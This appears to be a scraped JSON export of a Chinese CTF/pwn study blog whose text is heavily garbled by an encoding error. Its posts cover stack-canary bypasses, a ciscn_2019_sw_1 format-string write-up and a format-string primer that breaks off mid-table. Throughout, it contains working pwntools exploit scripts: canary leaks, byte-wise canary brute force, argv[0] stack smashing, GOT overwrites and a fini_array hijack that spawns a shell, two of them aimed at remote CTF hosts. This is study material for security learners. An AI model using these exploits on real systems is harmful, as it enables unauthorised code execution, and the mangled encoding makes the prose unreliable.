ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶ï¼Œä¼šåœ¨ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–è¿™ä¸ª Canary å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ TLS åŒºåŸŸçš„ä¸€ä¸ªç‰¹å®šåç§»é‡ä¸Šã€‚ å¯¹äº x86-64 Linuxï¼Œè¿™ä¸ªåç§»é‡é€šå¸¸æ˜¯ 0x28ã€‚æ‰€ä»¥ï¼Œfs:0x28 æŒ‡å‘çš„å†…å­˜åœ°å€å°±æ˜¯å½“å‰çº¿ç¨‹çš„ stack_guardï¼ˆå³ Canary å€¼ï¼‰çš„å­˜å‚¨ä½ç½®ã€‚ è€Œä¸”TLSä¸­çš„å€¼ç”±å‡½æ•°security_initè¿›è¡Œåˆå§‹åŒ– æœ€åï¼Œæ³¨æ„Canaryæœ€åçš„ä¸€ä¸ªå­—èŠ‚ä¼šè¢«è®¾ç½®ä¸º0ï¼Œé˜²æ­¢ç±»ä¼¼printfï¼ˆâ€%sâ€,&amp;bufï¼‰å½¢å¼çš„å‡½æ•°ä¸å°å¿ƒå°†Canaryçš„å€¼æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥ç”¨â€œ\\x00â€å­—ç¬¦ï¼ˆåœ¨Cè¯­è¨€ä¸­è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼‰æ¥åšä¸€ä¸ªæˆªæ–­ï¼Œå’ŒASLRæ²¡æœ‰å…³ç³»ã€‚ æ ˆç»“æ„ 1234[ buf (256 bytes) ] â† esp+0x00[ stack canary (4 bytes) ] â† esp+0x100[ saved ebp (4 bytes) ][ return address (4 bytes)] å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰ä¸‹é¢4ä¸ªæ€è·¯ï¼š 1ï¼‰åˆ©ç”¨æ³„éœ²å‡½æ•°æ³„éœ²å‡ºCanaryçš„å€¼ï¼Œå†è¿›è¡Œåˆ©ç”¨ã€‚ 2ï¼‰çˆ†ç ´å¾—åˆ°Canaryçš„å€¼ã€‚ 3ï¼‰__stack_chk_failå‡½æ•°æ³„éœ²å…³é”®ä¿¡æ¯ã€‚ 4ï¼‰ä¿®æ”¹TLSä¸­çš„stack_guardå€¼ã€‚ 1.leak_canaryï¼ˆæ³„éœ²Canaryå€¼ï¼‰ è„šæœ¬1ï¼ˆprintf_æ›¿ä»£&#x2F;x00ï¼‰12345678910111213141516171819from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b *0x08048631&quot;)main=0x0804867fbin= 0x080485CCpayload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary))payload=b&#x27;\\x00&#x27;*0x100+p32(canary)payload+=p32(0)*2payload+=p32(main)payload+=p32(bin)p.send(payload)p.interactive() 12345payload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary)) ç”¨bæ›¿ä»£canaryæœ€ä½ä½çš„\\x00,ä½¿å¾—å®ƒçš„å€¼å¯ä»¥è¢«è¾“å‡º ç„¶åç”¨æ”¶åˆ°çš„æ•°æ®å‡å»bçš„å€¼å°±æ˜¯canaryçš„å€¼ 1payload+=p32(0)*2 ä¸¤ä¸ªpadding åˆ†é…äº† 0x118å­—èŠ‚çš„æ ˆç©ºé—´ç»™å±€éƒ¨å˜é‡å’Œpaddingã€‚ æ ˆç©ºé—´ä¸€æ¬¡æ€§åˆ†é…ï¼Œä¾¿äºç®¡ç†å’Œæ€§èƒ½ ç¼–è¯‘å™¨åœ¨å‡½æ•°å…¥å£ä¼šæ‰§è¡Œç±»ä¼¼ sub esp, 0x118 çš„æ“ä½œï¼Œä¸€æ¬¡æ€§ç»™å‡½æ•°æ‰€æœ‰å±€éƒ¨å˜é‡ã€ä¸´æ—¶æ•°æ®å’Œå¯¹é½ç©ºé—´åˆ†é…è¶³å¤Ÿå¤§çš„è¿ç»­æ ˆç©ºé—´ã€‚åˆ†é…çš„ 280 å­—èŠ‚æ˜¯ buf + å…¶ä»–å±€éƒ¨å˜é‡ + padding è¿™å—ç©ºé—´é‡ŒåŒ…å«ä½ æ‰€æœ‰å±€éƒ¨å˜é‡ï¼ˆæ¯”å¦‚ bufï¼‰ã€éšå¼å˜é‡ï¼ˆæ¯”å¦‚ä¿å­˜çš„å¯„å­˜å™¨ï¼‰ã€ä»¥åŠä¸ºäº†æ»¡è¶³ CPU è®¿é—®å¯¹é½éœ€æ±‚è€Œæ’å…¥çš„ paddingã€‚ ä»ebpå¼€è¾Ÿäº†0x118ä¸ªå­—èŠ‚å­˜æ”¾ï¼Œä½†bufä»ebp-0x10cå¼€å§‹å­˜å‚¨ï¼Œæ¥ç€æ˜¯canaryï¼Œæ‰€ä»¥è¿˜æœ‰ä¸¤ä¸ªpadding canaryä¸ä¸€å®šæ˜¯æŒ¨ç€ç¼“å†²åŒºçš„ï¼Œå•åœ¨è¿™é“é¢˜æ˜¯çš„ æƒ…å†µ ä¼šæ’ canary ç´§æŒ¨æ•°ç»„å—ï¼Ÿ å‡½æ•°é‡Œæœ‰ char buf[xxx] âœ… ä¸€èˆ¬ä¼šæ”¾ canary åœ¨ buf åé¢ æ²¡æœ‰æ•°ç»„ã€ä¸ä¼šæ ˆæº¢å‡º âŒ é€šå¸¸ä¸ä¼šå¯ç”¨ canary æ•°ç»„ä¸åœ¨æ ˆä¸Šï¼ˆæ¯”å¦‚ malloc çš„ï¼‰ âŒ ä¸æ˜¯æ ˆä¿æŠ¤çš„èŒƒå›´ ç‰¹æ®Šä¼˜åŒ–æˆ–å†…è”å°å‡½æ•° âš ï¸ å¯èƒ½è¢«çœç•¥ è™½ç„¶ canary çš„ä½ç½®ä¸æ˜¯ç¡¬ç¼–ç çš„ï¼Œä½†åœ¨å®é™…åœºæ™¯ä¸­ï¼ˆç‰¹åˆ«æ˜¯é¢˜ç›®æ˜ç¡®æœ‰ char buf[] å¹¶å¼€å¯äº† canaryï¼‰ï¼Œå®ƒé€šå¸¸ å°±åœ¨ buf åé¢ï¼Œä¸”é€šè¿‡è°ƒè¯•æˆ–è¯•æ¢å¯ä»¥å‡†ç¡®ç¡®å®šå®ƒçš„åç§»ä½ç½®ã€‚ è„šæœ¬2ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰å¯ä»¥çœ‹åˆ°bufåœ¨ç¬¬7ä¸ªä½ç½®ä¸Š è€Œä¸”bufæœ‰256ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å­˜æ”¾64ä¸ªå­—ç¬¦ æ‰€ä»¥canaryå°±æ˜¯åœ¨ç¬¬64+7å³71ä¸ªå‚æ•°çš„ä½ç½® 123456789101112131415161718from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b printf&quot;)target = 0x080485CCp1 = &quot;%71$p\\n&quot;p.send(p1)leak_info = p.recvuntil(&quot;\\n&quot;,drop = True)canary = int(leak_info,16)log.success(&quot;canary:&quot; + hex(canary))p2 = b&quot;\\x00&quot; * 0x100 + p32(canary)p2 += p32(0) * 3p2 += p32(target)p.send(p2)p.interactive() 2.one_by_one_bruteforce(é€ä¸ªå­—èŠ‚çˆ†ç ´)é€šè¿‡forkå‡½æ•°å¼€å¯å­è¿›ç¨‹äº¤äº’çš„é¢˜ç›®ï¼Œå› ä¸ºforkå‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜ï¼Œæ‰€ä»¥æ¯æ¬¡åˆ›å»ºçš„å­è¿›ç¨‹çš„Canaryæ˜¯ç›¸åŒçš„ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œé€ä¸ªå­—èŠ‚åœ°å°†Canaryçˆ†ç ´å‡ºæ¥ã€‚ è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *p = process(&quot;./one_by_one_bruteforce&quot;)def bruteforece1bit(): global known for i in range(256): p1 = &quot;a&quot; * 0x108 p1 += known p1 += chr(i) p.sendafter(&quot;one_by_one_bruteforce\\n&quot;,p1) try: info = p.recvuntil(&quot;\\n&quot;) if &quot;*** stack smashing detected ***:&quot; in info: p.send(&quot;n\\n&quot;) continue else: known += chr(i) break except: log.info(&quot;maybe there something wrong&quot;) breakdef bruteforce_canary(): global known known += &quot;\\x00&quot; for i in range(7): bruteforece1bit() if i != 6: p.send(&quot;n\\n&quot;) else: p.send(&quot;y\\n&quot;)context.log_level = &quot;debug&quot;target = 0x000000000040083Eknown = &quot;&quot;bruteforce_canary()canary = u64(known)log.success(&quot;canary:&quot; + hex(canary))p2 = &quot;a&quot; * 0x108 + p64(canary) + p64(0) + p64(target)p.sendafter(&quot;go\\n&quot;,p2)p.interactive() é€å­—èŠ‚å°è¯•ï¼Œæ— â€œstack smashing detectedâ€æŠ¥é”™å›æ˜¾æ¥å¯¹Canaryçš„æ•°å€¼è¿›è¡Œé€å­—èŠ‚çˆ†ç ´ã€‚å¦‚æœè¾“å…¥æ­£ç¡®ï¼Œåˆ™æ²¡æœ‰å›æ˜¾ï¼Œèƒ½å¾—åˆ°Canaryçš„è¿™ä¸ªå­—èŠ‚ï¼Œç„¶åå¼€å§‹ä¸‹ä¸€ä¸ªå­—èŠ‚çš„çˆ†ç ´ï¼›å¦‚æœè¾“å…¥æœ‰è¯¯ï¼Œåˆ™çˆ†ç ´ä¸æˆåŠŸï¼Œç»§ç»­ä¸‹ä¸€ä¸ªçˆ†ç ´çš„æ•°å€¼ï¼Œçˆ†ç ´ä¸æˆåŠŸæ—¶å­è¿›ç¨‹ä¼šæŠ¥é”™é€€å‡ºï¼Œä½†ä¸ä¼šå½±å“çˆ¶è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹ä¼šä¸€ç›´åˆ›å»ºå­è¿›ç¨‹ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®ç°çˆ†ç ´ã€‚å¾—åˆ°Canaryçš„å…·ä½“æ•°å€¼åï¼Œå¯ä»¥åœ¨çˆ¶è¿›ç¨‹è¿›è¡Œæ ˆæº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€ï¼Œå®ç°Getshellï¼Œä¹Ÿå¯ä»¥åœ¨å­è¿›ç¨‹ä¸­å®ç°Getshellã€‚å› ä¸ºæœ‰äº†Canaryçš„å…·ä½“æ•°å€¼ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡Canaryä¿æŠ¤æœºåˆ¶ 3.stack_smashesstack_smashesæ˜¯ä¸€ç§ç‰¹æ®Šçš„åˆ©ç”¨æ€è·¯ã€‚å‰é¢å·²ç»æåˆ°è¿‡ï¼Œåœ¨_stack_chk_failå‡½æ•°ä¸­ä¼šå°†_libc_argv[0]çš„ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œ ä¾‹å¦‚(stack smashing detected : [ç¨‹åºå] terminatedï¼‰å¦‚æœèƒ½å¤Ÿæ§åˆ¶__libc_argv[0]ä¸­ä¿å­˜çš„åœ°å€ä¸ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯çš„åœ°å€ï¼Œé‚£ä¹ˆå°±èƒ½å¾—åˆ°ç›¸åº”çš„æ•°æ®ã€‚ åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œç¨‹åºåé€šå¸¸æ˜¯é€šè¿‡è¯»å– __libc_argv[0] è¿™ä¸ªå…¨å±€æŒ‡é’ˆæ¥å®ç°çš„ã€‚__libc_argv æ˜¯ libc åº“å†…éƒ¨ç»´æŠ¤çš„ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œå…¶ä¸­ __libc_argv[0] æŒ‡å‘å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²ã€‚ æ”»å‡»è€…é€šè¿‡ä»»æ„åœ°å€å†™å…¥ï¼ˆé€šå¸¸é€šè¿‡ ROP é“¾å®ç°ï¼‰å°† __libc_argv[0] è¿™ä¸ªæŒ‡é’ˆçš„å€¼ï¼Œä»åŸæ¥çš„ç¨‹åºååœ°å€ï¼Œä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦æ³„éœ²çš„æ•°æ®çš„åœ°å€ï¼ˆä¾‹å¦‚ flag çš„åœ°å€ï¼‰ã€‚ ğŸ” main å‡½æ•°çš„æ ‡å‡†åŸå‹ 1int main(int argc, char *argv[], char *envp[]); argc: å‘½ä»¤è¡Œå‚æ•°ä¸ªæ•° argv: å‚æ•°å­—ç¬¦ä¸²æ•°ç»„æŒ‡é’ˆ envp: ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²æ•°ç»„æŒ‡é’ˆ åœ¨æ ˆä¸Šï¼Œè¿™äº›å‚æ•°æ˜¯ç”± __libc_start_main è°ƒç”¨ main æ—¶ä¼ å…¥çš„ã€‚ æ‰€ä»¥æŸ¥çœ‹bufçš„åœ°å€ ç›´æ¥ä¸‹æ–­ç‚¹åˆ°readçš„ä½ç½®ï¼Œçœ‹åˆ°bufçš„ä½ç½®æ˜¯0x7fffffffdc00 æ¥ç€æŸ¥çœ‹libc_argc[1],å³æ–‡ä»¶ä¿¡æ¯ 0x7fffffffde18 è®¡ç®—å¥½åç§»ä¹‹åå°±å¯ä»¥æŠŠlibc_argc[0]çš„åœ°å€æ¢ä¸ºflagçš„åœ°å€äº† è„šæœ¬12345678910from pwn import *p = process(&quot;./stack_smashes&quot;)#gdb.attach(p,&quot;b *0x0000000000400875&quot;)context.log_level = &quot;debug&quot;flag_addr = 0x0601090p2 = &quot;a&quot; * 0x218 + p64(flag_addr)p.sendafter(&quot;stack_smashes\\n&quot;,p2)p.interactive() è¿˜æœ‰å°±æ˜¯ç›´æ¥æŠŠstack_chk_failå‡½æ•°çš„getè¡¨æ‘çš„åœ°å€æ”¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€ åç§»æ˜¯6 è„šæœ¬12345678910111213from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,word_size=&#x27;64&#x27;)p=remote(&quot;node5.buuoj.cn&quot;,25904)#p = process(&quot;./r2t4&quot;)elf = ELF(&quot;./r2t4&quot;)backdoor = 0x400626#__stack_chk_fail_got_addr = elf.got[&quot;__stack_chk_fail&quot;]__stack_chk_fail = elf.got[&#x27;__stack_chk_fail&#x27;]payload = fmtstr_payload(6, &#123;__stack_chk_fail: backdoor&#125;).ljust(0x38,b&#x27;a&#x27;)p.sendline(payload)p.interactive() æ€»ç»“æ¥è¯´ï¼Œljust(0x38, bâ€™aâ€™) çš„ç›®çš„æ˜¯ï¼š ç¡®ä¿ read å‡½æ•°è¯»å–åˆ°å®Œæ•´çš„ã€ç”±æˆ‘ä»¬æ§åˆ¶çš„ 56 å­—èŠ‚æ•°æ®ã€‚ é˜²æ­¢ read å‡½æ•°è¯»å–åˆ°å…¶ä»–ä¸å¯é¢„æµ‹çš„æ•°æ®ï¼Œä»è€Œå¹²æ‰° printf çš„è¡Œä¸ºã€‚","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"ciscn_2019_sw_1","slug":"ciscn-2019-sw-1","date":"2025-07-22T11:58:20.000Z","updated":"2025-09-03T10:55:55.833Z","comments":true,"path":"2025/07/22/ciscn-2019-sw-1/","permalink":"http://example.com/2025/07/22/ciscn-2019-sw-1/","excerpt":"","text":"å­˜åœ¨systemå‡½æ•°ï¼Œä¸éœ€è¦æ³„éœ²libcçš„åœ°å€ ç›´æ¥æŠŠprintfçš„gotè¡¨åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶åä¼ é€’å‚æ•°ä¸ºâ€œ&#x2F;bin&#x2F;shâ€å³å¯ è€Œä¸”åç§»æ˜¯4 ä½†æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åªè¢«æ‰§è¡Œäº†ä¸€æ¬¡ï¼Œæ— æ³•å®ç°æ“ä½œ æ‰€ä»¥è¦ä¿®æ”¹æ”¶å°¾å‡½æ•°çš„åœ°å€ä»¥å®ç°å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å¤šæ¬¡è°ƒç”¨ ç”¨readelfå»æ‰¾fini_arrayçš„åœ°å€ è„šæœ¬ 1234567891011121314151617181920212223242526272829from pwn import *from LibcSearcher import LibcSearcher#p=process(&quot;./ciscn_2019_sw_1&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29318)elf=ELF(&quot;./ciscn_2019_sw_1&quot;)fini=0x0804979cprintf=elf.got[&quot;printf&quot;]main=0x08048534sys=0x080483D0sys_h=(sys&gt;&gt;16)&amp;0xffffsys_l=sys&amp;0xffffmain_h=(main&gt;&gt;16)&amp;0xffffmain_l=main&amp;0xffffpayload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;#%cçš„æ„æ€æ˜¯æ‰“å°nä¸ªå­—ç¬¦payload+=b&quot;%5$hn&quot;payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;payload += b&#x27;\\x00&#x27;p.sendlineafter(b&quot;name?\\n&quot;,payload)payload=b&quot;/bin/sh&quot;p.sendlineafter(b&quot;name?\\n&quot;,payload)p.interactive() æ³¨æ„ å››ä¸ªå†™å…¥çš„æ•°æ˜¯é€’å¢çš„ å¦‚ä½•å–é«˜ 16 ä½ åœ°å€å³ç§» 16 ä½ï¼šsystem_plt &gt;&gt; 16 æŠŠé«˜ 16 ä½â€œç§»åˆ°â€æœ€ä½ä½ å¯¹äº 0x080483d0ï¼š 10x080483d0 &gt;&gt; 16 = 0x0804 ä¸ºä»€ä¹ˆè¿˜è¦ &amp; 0xffffï¼Ÿ å› ä¸ºé«˜ 16 ä½è™½ç„¶å·²ç»ç§»åˆ°ä½ä½äº†ï¼Œä½† Python æ•´æ•°æ²¡æœ‰â€œæº¢å‡ºâ€æ¦‚å¿µã€‚ ä¸ºäº†ç¡®ä¿æœ€ç»ˆç»“æœåªä¿ç•™ä½ 16 ä½ï¼ˆå³æœ€å¤§ä¸è¶…è¿‡ 0xffffï¼‰ï¼Œå°±ç”¨æ©ç  0xffff å–æœ€ä½ 16 ä½ã€‚ 1b&#x27;%&#x27; + bytes(str(xxx), &quot;utf-8&quot;) + b&#x27;c%4$hn&#x27; è¿™é‡Œçš„å«ä¹‰æ˜¯ï¼š è¿™ä¸²å­—ç¬¦ä¸²æ‹¼æ¥åæ˜¯å•¥æ ·ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ xxx &#x3D; 100ï¼Œæ‹¼æ¥ç»“æœæ˜¯ï¼š 1b&#x27;%100c%4$hn&#x27; è¿™åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œçš„æ„æ€%100c ï¼šå‘è¾“å‡ºç¼“å†²åŒºå†™å…¥ 100ä¸ªç©ºæ ¼å­—ç¬¦ï¼Œä½¿å¾—â€œå·²ç»è¾“å‡ºå­—ç¬¦æ•°â€åŠ 100ã€‚ %4$hn ï¼šæŠŠå½“å‰çš„è¾“å‡ºå­—ç¬¦æ•°ï¼ˆç°åœ¨åº”è¯¥æ˜¯å‰é¢å·²æœ‰å­—ç¬¦æ•° + 100ï¼‰å†™å…¥ ç¬¬4ä¸ªå‚æ•°æŒ‡å‘çš„åœ°å€ï¼Œå†™å…¥2å­—èŠ‚ã€‚ ä¸ºä»€ä¹ˆä¸ç”¨ %n ç›´æ¥å†™ 4 å­—èŠ‚ï¼Ÿï¼ˆä¸¤ä¸ªå­—èŠ‚ç”¨hn,å››å­—èŠ‚ç”¨nï¼‰ ç†è®ºä¸Šå¯ä»¥ç›´æ¥ç”¨ %n ä¸€æ¬¡å†™å®Œæ•´ 4 å­—èŠ‚ï¼ˆä¸€ä¸ª intï¼‰ï¼Œä½†æ˜¯ï¼š 1ï¸âƒ£ æ•°å­—èŒƒå›´çš„é—®é¢˜ å¦‚æœä½ æƒ³å†™çš„æ•°æ˜¯ï¼š 12å¤åˆ¶ç¼–è¾‘0x08048534 é‚£å°±æ˜¯ï¼š134513204ï¼ˆåè¿›åˆ¶ï¼‰ï¼Œè€Œæ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œçš„è¾“å‡ºå­—ç¬¦æ•°å¿…é¡»åˆšå¥½æ˜¯è¿™ä¸ªæ•°æ‰èƒ½å†™å‡ºæ¥ã€‚ ä½ éœ€è¦è¾“å‡º 134,513,204 ä¸ªå­—ç¬¦æ‰èƒ½è®© %n å†™å‡ºè¿™ä¸ªæ•°â€¦â€¦æ˜¾ç„¶ä¸ç°å®ï¼Œç¨‹åºå¾ˆå¯èƒ½å´©æºƒæˆ–è¶…æ—¶ã€‚ fini.arrayåŸç†ğŸ›¡ï¸ 1ï¸âƒ£ RELRO ä¸å„æ®µçš„å¯å†™æ€§ ELF ç¨‹åºé‡Œæœ‰è¿™å‡ ä¸ªå…³é”®çš„è¡¨&#x2F;æ®µï¼š æ®µ&#x2F;è¡¨ æ­£å¸¸ä½œç”¨ ä¸ºä»€ä¹ˆèƒ½å†™ RELROä¿æŠ¤åçš„å˜åŒ– .got.plt å­˜å‚¨åŠ¨æ€é“¾æ¥å‡½æ•°çš„çœŸå®åœ°å€ï¼ˆlazy bindingåï¼‰ lazy binding éœ€è¦å†™å…¥çœŸå®åœ°å€ NO RELRO æ—¶å¯å†™ï¼ŒPARTIAL RELRO ä¹Ÿå¯å†™ï¼ŒFULL RELRO æ—¶ä¸å¯å†™ .init_array ç¨‹åºå¯åŠ¨æ—¶è°ƒç”¨çš„å‡½æ•°æ•°ç»„ å­˜å‡½æ•°æŒ‡é’ˆ NO RELRO æ—¶å¯å†™ï¼ŒPARTIAL&#x2F;FULL æ—¶ä¸å¯å†™ .fini_array ç¨‹åºé€€å‡ºæ—¶è°ƒç”¨çš„å‡½æ•°æ•°ç»„ å­˜å‡½æ•°æŒ‡é’ˆ NO RELRO æ—¶å¯å†™ï¼ŒPARTIAL&#x2F;FULL æ—¶ä¸å¯å†™ âœ¨âœ… .fini_array å­˜çš„æ˜¯é€€å‡ºæ—¶è¦è°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆã€‚âœ… åˆ©ç”¨æ—¶å…ˆæŠŠ .fini_array=mainï¼Œé€€å‡ºæ—¶é‡å¯ mainï¼Œç»™ä½ å¤šä¸€æ¬¡åˆ©ç”¨æœºä¼šã€‚âœ… é€šå¸¸ .fini_array åªæœ‰ä¸€ä¸ªæŒ‡é’ˆçš„ä½ç½®ï¼Œåªèƒ½å†™ä¸€ä¸ªã€‚ ğŸ” ä¸ºä»€ä¹ˆ .fini_array èƒ½å¸®å¿™ å› ä¸ºï¼š 1ï¸âƒ£ ç¨‹åºé€€å‡ºæ—¶ï¼Œlibc ä¼šä¸»åŠ¨å»éå† .fini_arrayï¼Œæ‰§è¡Œé‡Œé¢çš„å‡½æ•°æŒ‡é’ˆã€‚ 2ï¸âƒ£ é»˜è®¤ .fini_array[0] æŒ‡å‘æŸä¸ªæ”¶å°¾å‡½æ•°ã€‚ 3ï¸âƒ£ å¦‚æœä½ æŠŠ .fini_array[0] æ”¹æˆ main çš„åœ°å€ï¼Œé‚£ç¨‹åºåœ¨é€€å‡ºæ—¶å°±ä¼šå†ä¸€æ¬¡è°ƒç”¨ mainï¼Œç›¸å½“äºé‡å¯äº†ç¨‹åºã€‚ æ”¶å°¾å‡½æ•°ã€æ˜¯ç¨‹åºé€€å‡ºï¼ˆæˆ–ç»“æŸï¼‰å‰ï¼Œæ“ä½œç³»ç»Ÿæˆ–è¿è¡Œæ—¶ç¯å¢ƒä¼šè°ƒç”¨è¿™äº›å‡½æ•°æ¥åšå–„åå·¥ä½œã€‚ æµç¨‹å¤§è‡´æ˜¯ï¼š 1main å‡½æ•°æ‰§è¡Œ â†’ main è¿”å› â†’ è¿è¡Œæ—¶å¼€å§‹è°ƒç”¨â€œæ”¶å°¾å‡½æ•°â€ â†’ èµ„æºé‡Šæ”¾å®Œæ¯• â†’ ç¨‹åºå®Œå…¨é€€å‡º sendlineafter() vs sendafter() çš„åŒºåˆ« å‡½æ•° è¡Œä¸º æ˜¯å¦è‡ªåŠ¨åŠ  \\n é€‚ç”¨åœºæ™¯ sendlineafter() ç­‰å¾…ç‰¹å®šå­—ç¬¦ä¸²å‡ºç°åå‘é€æ•°æ®ï¼Œè‡ªåŠ¨åœ¨æœ«å°¾åŠ  \\nï¼ˆæ¢è¡Œç¬¦ï¼‰ âœ… æ˜¯ é€‚ç”¨äºéœ€è¦æ¢è¡Œç¬¦çš„äº¤äº’ï¼ˆå¦‚ scanfã€getsã€fgetsï¼‰ sendafter() ç­‰å¾…ç‰¹å®šå­—ç¬¦ä¸²å‡ºç°åå‘é€æ•°æ®ï¼Œä¸è‡ªåŠ¨åŠ  \\n âŒ å¦ é€‚ç”¨äºä¸éœ€è¦æ¢è¡Œç¬¦çš„äº¤äº’ï¼ˆå¦‚ readã€recvï¼‰ åœ¨è¿™é‡Œæˆ‘ä»¬æ˜¯ç”¨scanfè¯»å–æ•°æ®ï¼Œå®ƒåœ¨è¯»å–åˆ°&#x2F;næ—¶æ‰ä¼šåœæ­¢ï¼Œæ‰€ä»¥è¦ç”¨sendlineafter()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"fini_array","slug":"fini-array","permalink":"http://example.com/tags/fini-array/"},{"name":"åˆ†å­—èŠ‚","slug":"åˆ†å­—èŠ‚","permalink":"http://example.com/tags/%E5%88%86%E5%AD%97%E8%8A%82/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","date":"2025-07-21T01:05:48.000Z","updated":"2025-08-30T11:58:48.243Z","comments":true,"path":"2025/07/21/æ ¼å¼åŒ–å­—ç¬¦ä¸²/","permalink":"http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"åŸç†æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å®ƒè§£æä¹‹åçš„å‚æ•°ã€‚ é€šä¿—æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„ä½œç”¨æ˜¯å°†è®¡ç®—æœºå†…å­˜ä¸­çš„æ•°æ®è½¬åŒ–ä¸ºäººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š (1ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ã€‚ (2ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚ (3ï¼‰åç»­å‚æ•°ï¼Œå¯é€‰ã€‚ ç”¨printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalaryï¼‰ printfå‡½æ•°å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼Œâ€name:%s,age:%d,salary:%4.2fâ€å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œâ€œmyname,myage,mysalaryâ€å«ä½œåç»­å‚æ•°ã€‚ ğŸ§± å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¦å· æ ¼å¼ç¬¦ ä½œç”¨ ç¤ºä¾‹ %x&#x2F;%p ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºæ ˆä¸Šçš„å€¼ %xâ†’0xdeadbeef %pé€šå¸¸å¸¦0xå‰ç¼€ %d&#x2F;%u ä»¥åè¿›åˆ¶è¾“å‡ºæ ˆä¸Šçš„å€¼ %dâ†’3735928559 %c è¾“å‡ºæ ˆä¸Šå€¼çš„æœ€ä½ä¸€ä¸ªå­—èŠ‚ %câ†’&#39;A&#39; %s æŠŠæ ˆä¸Šçš„å€¼å½“ä½œåœ°å€ï¼Œè¾“å‡ºè¯¥åœ°å€çš„å­—ç¬¦ä¸² %sâ†’&quot;Hello&quot; %hn å†™å…¥ 2 å­—èŠ‚ï¼ˆshortï¼‰ %hnâ†’ å†™å…¥ä½ 2 å­—èŠ‚ %hhn å†™å…¥ 1 å­—èŠ‚ï¼ˆcharï¼‰ %hhnâ†’ å†™å…¥ä½ 1 å­—èŠ‚ %n 